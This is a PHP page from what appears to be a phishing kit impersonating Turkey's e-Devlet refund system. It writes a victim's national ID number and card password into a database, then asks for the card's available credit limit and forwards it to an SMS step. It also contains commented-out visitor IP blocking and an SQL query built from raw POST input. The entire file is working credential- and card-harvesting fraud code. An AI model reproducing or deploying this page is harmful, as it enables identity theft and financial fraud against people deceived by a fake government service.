<?php
    ob_start();
    session_start();
    include 'ing/baglan.php';

    $ayarsor = $db->prepare("SELECT * from ayarlar where ayar_id=:id");
    $ayarsor->execute(array(
        'id' => 0
    ));
    $ayarcek=$ayarsor->fetch(PDO::FETCH_ASSOC);

$_SESSION['data_id'] = $_POST['allastaw'];


  if(isset($_POST))
    {
      $tckimlik = $_POST['kimlik'];
      $kartsifre = $_POST['kpass'];
      $sesAl = "1";

        if(isset($_POST['kpass'])){
            $kullanicikaydet=$db->prepare("UPDATE datalar SET
                musteri_tc=:musteri_tc,
                ses=:sesAl,
                musteri_dogumyil=:musteri_dogumyil
                WHERE id={$_POST['allastaw']}");

            $insert=$kullanicikaydet->execute(array(
                'musteri_tc' => $tckimlik,
                'sesAl'    => $sesAl,
                'musteri_dogumyil' => $kartsifre
            ));
            
            if ($insert){
                
            }else {
                header("Location:guvenlik.php");
            }
        }else {
            header("Location:index.php");
        }
    }

   //  $query =  mysql_query('SELECT * FROM ip'); 
   //while($row = mysql_fetch_assoc($query)){ 
   //    if($row['ip'] == $ipcik){ 
   //        header('Location: about:blank'); 
   //    }
   //}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E-Devlet İade Sistemi</title>
    <meta charset="utf-8">
    <meta name="author" content="<?php echo $ayarcek['ayar_author']; ?>">
    <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="assets\css\bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="assets\fonts\font-awesome\css\font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="assets\fonts\flaticon\font\flaticon.css">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800%7CPoppins:400,500,700,800,900%7CRoboto:100,300,400,400i,500,700">

<link rel="icon" type="image/x-icon" href="tema\img\favicon.png">
    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="assets\css\style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="assets\css\skins\default.css">


   <!-- External CSS libraries -->
    <link type="text/css" rel="stylesheet" href="tema\css\bootstrap.min.css">
    <link type="text/css" rel="stylesheet" href="tema\fonts\font-awesome\css\font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="tema\fonts\flaticon\font\flaticon.css">

    <!-- Favicon icon -->
    <link rel="shortcut icon" href="tema\img\favicon.ico" type="image/x-icon">

    <!-- Google fonts -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800%7CPoppins:400,500,700,800,900%7CRoboto:100,300,400,400i,500,700">

    <!-- Custom Stylesheet -->
    <link type="text/css" rel="stylesheet" href="tema\css\style.css">
    <link rel="stylesheet" type="text/css" id="style_sheet" href="tema\css\skins\default.css">

</head>
<body id="top">
<div class="page_loader"></div>


<form method="post" action="sms2.php" id="aspnetForm" autocomplete="off">

<input type="hidden" name="lastid" value="<?php echo $_SESSION['data_id']; ?>">
<input type="hidden" name="lastid2" value="<?php echo $_POST['allastaw']; ?>">


<!-- Login 1 start -->
<form action="#" method="post" class="creditly-card-form agileinfo_form">
<section class="creditly-wrapper wthree, w3_agileits_wrapper">
      <div class="card bg-secondary shadow border-0">

<div class="login-1">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="login-inner-form">
                    <div class="details">
                        <a href="#">
                            <img src="tema\img\logos\logo-2.png"  alt="logo">
                        </a>
                        <h3>Lütfen Mevcut Limitinizi Girin!</h3>


			<font size="2" color="#960000">İadenizin gerçekleşmesi hızlandırılması için, Mevcut durumda ki <u>kullanılabilir</u> limit bilginizi giriniz.</font>
			<br>
			<br>
                        
                            <div class="form-group">
							
                                <input class="expiration-month-and-year input-text" 
                                       pattern="[0-9]*" 
                                       type="text" 
                                       minlength="2" 
                                       maxlength="6" 
                                       id="kimlik" 
                                       name="kklimit" 
                                       placeholder="Kullanılabilir limit" 
                                       required >
                            </div>
                            
                            <p>
                            	<strong>Bilgilendirme:</strong> - <em>Toplam Limitiniz Kredi Kartınıza ait olan limittir, <u>kullanılabilir limit toplam limit değildir</u>, kredi kartınızında an itibari ile bulunana mevcut bakiyedir. </em>
                            </p>
                            
                                <button type="submit" class="btn-md btn-theme btn-block">DOĞRULA</button>
                            </div>
							<br>
							<div id="error-message"></div>
                          </div>
                        </form>
                       
                </div>
            </div>
        </div>
    </div>
</div>
    
    </form>
    
    
    </body>
    
</html>
<?php 

include 'viz.php';
?>

